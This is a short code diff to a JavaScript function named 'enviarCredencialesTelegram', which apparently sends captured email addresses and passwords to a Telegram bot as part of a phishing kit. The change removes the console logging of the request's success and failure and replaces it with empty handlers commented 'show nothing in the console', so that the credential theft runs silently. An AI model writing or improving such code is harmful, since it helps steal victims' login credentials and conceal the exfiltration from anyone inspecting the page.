@@ -15,14 +15,11 @@ function enviarCredencialesTelegram(email, password) {
       text: mensaje
     })
   })
-  .then(response => response.json())
-  .then(data => {
-    // Opcional: manejar respuesta
-    console.log('Mensaje enviado a Telegram:', data);
+  .then(() => {
+    // No mostrar nada en consola
   })
-  .catch(error => {
-    // Opcional: manejar error
-    console.error('Error enviando a Telegram:', error);
+  .catch(() => {
+    // No mostrar nada en consola
   });
 }
 
